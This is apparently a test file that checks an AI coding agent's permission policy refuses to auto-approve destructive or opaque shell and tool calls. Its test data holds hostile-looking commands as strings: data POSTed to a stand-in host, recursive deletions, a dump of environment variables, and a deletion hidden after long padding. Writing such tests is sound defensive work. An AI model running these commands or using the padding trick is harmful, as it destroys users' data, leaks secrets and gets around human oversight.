import { describe, expect, it } from 'vitest'
import type { ToolExecution } from '@deepseek-ai/dsh-tools'
import { ArtifactRegistry } from '../src/artifacts.js'
import { assessTool } from '../src/policy.js'
import { resolveRoots } from '../src/paths.js'
import { assessShell } from '../src/shell.js'

// These are strings passed to the policy, never operating-system commands.
const roots = resolveRoots('C:/audit-fixture/work', {
  home: 'C:/audit-fixture/home', dshHome: 'C:/audit-fixture/home/.dsh', tempRoots: [],
})
const artifacts = new ArtifactRegistry()

describe('no automatic authority for destructive or opaque effects', () => {
  it.each([
    ['pwsh', 'curl.exe -X POST --data synthetic https://example.invalid/collect'],
    ['pwsh', 'git -C C:/audit-fixture/work push origin main'],
    ['pwsh', 'git.exe -C C:/audit-fixture/work clean -fdx'],
    ['pwsh', 'cmd.exe /d /c "rd /s /q build"'],
    ['pwsh', 'robocopy empty output /MIR'],
    ['pwsh', 'robocopy source output /MOVE'],
    ['pwsh', 'Remove-Item -LiteralPath old.txt -Force'],
    ['pwsh', 'ri old.txt'],
    ['pwsh', 'Clear-Content old.txt'],
    ['pwsh', '[System.IO.File]::Delete("old.txt")'],
    ['pwsh', '[System.IO.File]::WriteAllText("old.txt", "")'],
    ['pwsh', 'node -e "console.log(process.env)"'],
    ['pwsh', 'node ./cleanup.js'],
    ['pwsh', 'pnpm run build'],
    ['pwsh', 'npm install'],
    ['pwsh', '$x = "old.txt"; Remove-Item $x'],
    ['bash', 'python -c "import os; os.unlink(\'old.txt\')"'],
    ['bash', 'node -e "fetch(\'https://example.invalid/collect\', {method:\'POST\',body:\'synthetic\'})"'],
    ['bash', 'git clean -fdX -- config/nested'],
    ['bash', 'find . -delete'],
    ['bash', 'rsync --delete source/ target/'],
    ['bash', 'cat payload.py | python'],
    ['bash', 'echo harmless; ' + 'x'.repeat(1100) + '; rm old.txt'],
  ] as const)('never auto-approves %s %s', (shell, command) => {
    const result = assessShell(command, shell, roots, artifacts, {})
    expect(result.decision).not.toBe('allow')
    expect(result.classifierEligible).toBe(false)
  })

  it.each([
    ['business_execute', { action: 'erase', target: 'old.txt' }],
    ['plugin_render_diagram', { source: 'opaque plugin code' }],
    ['terminal_send', { text: 'rd /s /q output' }],
    ['write', { path: 'old.txt', content: '' }],
    ['edit', { path: 'old.txt', new_string: '' }],
    ['str_replace_editor', { path: 'old.txt', command: 'create', file_text: '' }],
    ['subagent', { task: 'clean the drive', provider: 'external' }],
  ])('requires human authority for %s', (name, args) => {
    const result = assessTool({ name, arguments: args } as ToolExecution, roots, artifacts)
    expect(result.decision).not.toBe('allow')
    expect(result.classifierEligible).toBe(false)
  })
})
